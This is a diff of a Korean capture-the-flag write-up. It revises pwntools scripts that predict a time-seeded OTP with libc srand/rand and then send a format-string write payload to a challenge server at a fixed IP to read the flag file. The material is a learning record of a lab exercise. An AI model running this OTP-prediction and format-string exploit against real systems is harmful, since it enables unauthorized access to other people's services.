@@ -134,7 +134,7 @@ int readLastReport()
 }
 ```
 
-report.txt를 읽을 수 있다. 아마 저게 flag일 건데 사실 서버에는 rand가 계속 안맞아서 못해보고.. 로컬에서만 출력시켰다. 저게 flag가 아니어도 포맷스트링은 무한으로 가능하기 때문에 다른 식으로라도 풀 수 있다.
+report.txt를 읽을 수 있다. 
 
 ```python
 from pwn import *
@@ -145,91 +145,22 @@ from datetime import datetime
 r = lambda w: t.recvuntil(str(w))
 s = lambda z: t.sendline(str(z))
 
-i = 0
-while True:
-	try:
-		#tm = process('./time')
-		#t = process('./binary')
-		t = remote('185.66.87.233', 5002)
-		#b = int(tm.recvline().replace('\n',''),10)
-		#a = int(tm.recv().replace('\n',''),10)
-		#tm.close()
-		#log.success("rand ==> " + hex(a))
-		#log.success("time ==> " + hex(b))
+t = remote('185.66.87.233', 5002)
 
-		libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
-		#timestamp = time.mktime(datetime.today().timetuple())
-		#b = int(float(timestamp))
-		b = libc.time(0) + i
-		log.success("time ==> " + hex(b))
-		libc.srand(0x74*2 + b)
-		a = libc.rand()
-		log.success("rand ==> " + hex(a))
-
-		r("Login:")
-		s("test_account")
-		r("Password:")
-		s("test_password")
-		r("Enter the OTP code:")
-		s(a)
-
-		print i 
-		i = i + 1
-
-		print t.recv()
-		print t.recv()
-		print t.recv()
-		
-		r(">")
-		s("2")
-		r(">")
-		s(p32(0x0804C058) + "%7$n")
-		r(">")
-		s("1")
-		
-		t.interactive()
-	except Exception as e:
-		pass
-	finally:
-		t.close()
-```
-
-시드 맞추려고 계속 돌리는.. 것인데 c파일에서도 하고 cdll으로도 했는데 내가 시드를 못 맞춘 이유는 ㅋㅋㅋㅋㅋ scanf가 %d로 입력인데 그거 모르고 팩해서 보내버려서 안맞는 거였음… 그거 땜에 이상한 짓만….
-
-```python
-libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
-b = libc.time(0)
-libc.srand(0x74*2 + b)
-a = libc.rand()
-```
-
-이게 time based srand 맞추기가 참 좋은듯 하다. 여러가지로 해봤으니 언젠간 쓸일이 있겠지!
-
-```python
-from pwn import *
-from ctypes import *
-import time
-from datetime import datetime
-
-r = lambda w: t.recvuntil(str(w))
-s = lambda z: t.sendline(str(z))
-
-t = process('./binary')
-
-libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
 #timestamp = time.mktime(datetime.today().timetuple())
 #b = int(float(timestamp))
-b = libc.time(0) + i
-log.success("time ==> " + hex(b))
-libc.srand(0x74*2 + b)
-a = libc.rand()
-log.success("rand ==> " + hex(a))
 
 r("Login:")
 s("test_account")
 r("Password:")
 s("test_password")
 r("Enter the OTP code:")
+libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
+b = libc.time(0)
+log.success("time ==> " + hex(b))
+libc.srand(0x74*2 + b)
+a = libc.rand()
+log.success("rand ==> " + hex(a))
 s(a)
 
 r(">")
@@ -240,9 +171,18 @@ r(">")
 s("1")
 
 t.interactive()
-->
-/bin/cat: report.txt: 그런 파일이나 디렉터리가 없습니다
 ```
 
-음.. 나중엔 서버랑도 맞게 해야 할텐데 ㅠ 서버 시간 UTC로 바꿔도 안되길래 그냥 포기했다.. 서버도 너무 느리고해서 나중에 이런 문제 나오면 다시 제대로 맞춰봐야지!
+서버가 너무 느려서 바로 보내기 직전에 time을 돌려줘야 하는 듯 ㅋㅋㅋㅋ (계속 안맞았었다 ㅠㅠ) report.txt가 flag여서 금방 끝 (rand 맞추는게 의도 였던 것 같다!)
+
+```python
+libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
+b = libc.time(0)
+libc.srand(0x74*2 + b)
+a = libc.rand()
+```
+
+이게 time based srand 맞추기가 참 좋은듯 하다.(앞으로 이거 써야지) 
+
+사실 시드 맞추는 데 여러 뻘짓이 있었는데.. OTP 입력하는 scanf가 %d였는데 %s인줄 알고 계속 팩해서 보냈어서 안맞았던 거였다 ㅠ.. 그래도 여러 방법으로 해봤으니 언젠간 쓸일이 있겠지!
 
